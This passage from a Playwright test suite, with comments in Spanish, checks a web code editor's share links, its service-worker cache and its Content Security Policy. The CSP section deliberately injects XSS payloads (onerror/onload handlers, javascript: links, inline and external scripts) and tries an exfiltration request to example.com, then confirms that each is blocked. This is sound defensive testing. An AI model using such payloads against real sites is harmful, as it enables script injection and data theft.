      check(/^https:\/\/wa\.me\/\d*\?text=/.test(href2) && href2.length < 2100, 'con una nota hostil el enlace sigue siendo de wa.me y de largo acotado (' + href2.length + ')');
      const previa = await pg.$eval('#cPrev', (p) => p.textContent);
      check(previa.indexOf('<img') >= 0, 'la vista previa muestra la nota como texto');
      await cerrar(pg);
      await limpio(pg, 'casos: nada se ejecuta');
      await viva(pg, 'casos: el editor sigue funcionando');
      sinErrores(pg, 'casos: sin errores de la página');
      await cx.close();
    }

    /* ---------- 7) service worker ---------- */
    console.log('7) service worker');
    {
      const cx = await br.newContext(VP);
      const pg = await pagina(cx);
      await pg.goto(BASE); await pg.waitForSelector('#code');
      await pg.evaluate(() => navigator.serviceWorker.ready);
      await pg.waitForFunction(() => !!navigator.serviceWorker.controller, null, { timeout: 8000 }).catch(() => {});
      await pg.reload(); await pg.waitForSelector('#code');
      check(await pg.evaluate(() => !!navigator.serviceWorker.controller), 'el service worker controla la página');
      // pedidos raros no agregan nada a la caché: solo queda la lista fija del armado
      const esperados = JSON.parse(/const FILES = (\[.*?\]);/.exec(fs.readFileSync(path.join(root, 'sw.js'), 'utf8'))[1]).length;
      await pg.evaluate(async (p) => {
        const urls = ['index.html?x=' + encodeURIComponent(p), 'assets/app.js?' + encodeURIComponent(p), 'no-existe.js', 'assets/../index.html', 'index.html#p=' + encodeURIComponent(p), 'docs/COMPATIBILIDAD.md'];
        for (const u of urls) { try { await fetch(u); } catch (e) { /* nada */ } }
        try { await fetch('index.html', { method: 'POST', body: p }); } catch (e) { /* nada */ }
      }, P);
      const cache = await pg.evaluate(async () => { const ks = await caches.keys(); let n = 0; const raras = []; for (const k of ks) { const c = await caches.open(k); const rs = await c.keys(); n += rs.length; rs.forEach((r) => { if (/[?#]|no-existe|docs\//.test(r.url)) raras.push(r.url); }); } return { claves: ks, n, raras }; });
      check(cache.claves.length === 1 && cache.n === esperados && cache.raras.length === 0, 'la caché solo tiene los ' + esperados + ' archivos del armado (' + cache.n + ' en ' + cache.claves.length + ' caché) y los pedidos raros no agregan nada');
      // navegar, con el service worker activo, a un archivo del sitio que no está en la caché tiene que traer ESE archivo (no index.html)
      const pg2 = await pagina(cx);
      const resp = await pg2.goto(BASE + 'dist/editor-c.html'); await pg2.waitForSelector('#code');
      const esUnico = await pg2.evaluate(() => !document.querySelector('link[rel="manifest"]') && document.querySelectorAll('script[src]').length === 0);
      check(resp && resp.status() === 200 && esUnico, 'con el service worker activo, dist/editor-c.html abre el archivo único y no la página principal');
      await viva(pg2, 'el archivo único abierto desde el sitio funciona');
      const r404 = await pg2.goto(BASE + 'no-existe/pagina.html').catch(() => null);
      check(r404 && r404.status() === 404, 'una página que no existe da 404 cuando hay conexión (no se disfraza de la página principal)');
      await pg2.close();
      // sin conexión: la página principal y un enlace con programa siguen abriendo
      await cx.setOffline(true);
      const pg3 = await pagina(cx);
      await pg3.goto(BASE + 'index.html?ayuda=2' + enlaceR({ v: 1, n: 'Sin red', c: HOLA })); await pg3.waitForSelector('#code');
      check(await pg3.waitForSelector('#dRecibido[open]', { timeout: 5000 }).then(() => true, () => false), 'sin conexión, un enlace con programa abre igual');
      await viva(pg3, 'sin conexión, el editor compila y ejecuta');
      const pg4 = await pagina(cx);
      const fuera = await pg4.goto(BASE + 'cualquier/cosa').then((r) => r && r.status(), () => 0); await pg4.waitForSelector('#code', { timeout: 4000 }).catch(() => {});
      check(fuera === 200 && !!(await pg4.$('#code')), 'sin conexión, una dirección desconocida del sitio muestra el editor');
      await cx.setOffline(false);
      sinErrores(pg, 'service worker: sin errores de la página');
      await cx.close();
    }

    /* ---------- 8) política de seguridad de contenido (CSP) ---------- */
    console.log('8) política de seguridad de contenido (CSP)');
    for (const [nombre, url] of [['sitio por http', BASE + 'index.html'], ['doble clic (file://)', ARCHIVO], ['archivo único (file://)', UNICO]]) {
      const cx = await br.newContext(VP);
      const pg = await pagina(cx);
      await pg.addInitScript(() => { window.__csp = []; document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(e.violatedDirective + ' ' + e.blockedURI)); });
      let workers = 0; pg.on('worker', () => { workers++; });
      await pg.goto(url); await pg.waitForSelector('#code');
      const meta = await pg.evaluate(() => { const m = document.querySelector('meta[http-equiv="Content-Security-Policy"]'); return m ? m.getAttribute('content') : ''; });
      check(/default-src 'none'/.test(meta) && /script-src/.test(meta) && !/script-src[^;]*'unsafe-inline'/.test(meta), nombre + ': la página trae la política y no permite scripts en línea');
      await viva(pg, nombre + ': con la política, compila y ejecuta');
      check(workers >= 1, nombre + ': el programa corre en un Worker armado desde un Blob (no cae a ejecutarse en la página)');
      check(await pg.evaluate(() => getComputedStyle(document.getElementById('code')).fontFamily.indexOf('Source Code Pro') >= 0 && document.fonts.check('15px "Source Code Pro"')), nombre + ': la fuente del código carga');
      // captura (imagen blob:), ayuda y pruebas (Worker por cada prueba)
      await abrir(pg, '#shot', '#dShot'); await pg.waitForFunction(() => { const i = document.getElementById('shotImg'); return i.complete && i.naturalWidth > 0; }, null, { timeout: 6000 }).catch(() => {});
      check(await pg.evaluate(() => document.getElementById('shotImg').naturalWidth > 0), nombre + ': la captura PNG se arma y se ve');
      await cerrar(pg);
      const violPropias = await pg.evaluate(() => window.__csp.slice());
      check(violPropias.length === 0, nombre + ': el uso normal no choca con la política' + (violPropias.length ? ' [' + violPropias.slice(0, 3).join(' | ') + ']' : ''));
      // defensa en profundidad: aunque algún día se colara marcado en la página, no se ejecuta ni saca datos
      await pg.evaluate(() => {
        const d = document.createElement('div');
        d.innerHTML = '<img src=x onerror="window.__pwn=1"><svg onload="window.__pwn=1"></svg><a id="__js" href="javascript:window.__pwn=1">x</a><img src="https://example.com/robo?d=1">';
        document.body.appendChild(d); document.getElementById('__js').click();
        const s = document.createElement('script'); s.textContent = 'window.__pwn=1'; document.body.appendChild(s);
        const s2 = document.createElement('script'); s2.src = 'https://example.com/x.js'; document.body.appendChild(s2);
      });
      await pg.waitForTimeout(400);
      const red = await pg.evaluate(() => fetch('https://example.com/robo', { mode: 'no-cors' }).then(() => 'salió', () => 'bloqueado'));
      const e = await pg.evaluate(() => ({ pwn: window.__pwn || 0, v: window.__csp.length }));
      check(e.pwn === 0 && e.v >= 4, nombre + ': marcado y scripts inyectados a propósito no se ejecutan (' + e.v + ' bloqueos de la política)');
      check(red === 'bloqueado', nombre + ': la página no puede mandar datos a otro sitio');
      sinErrores(pg, nombre + ': sin errores de la página');
      await cx.close();
    }
  } catch (e) { fallas++; console.log('  FALLA la prueba se cortó: ' + (e && e.stack || e)); }
  await br.close(); srv.close();
  console.log(ok + ' ok, ' + fallas + ' fallas'); process.exit(fallas ? 1 : 0);
});
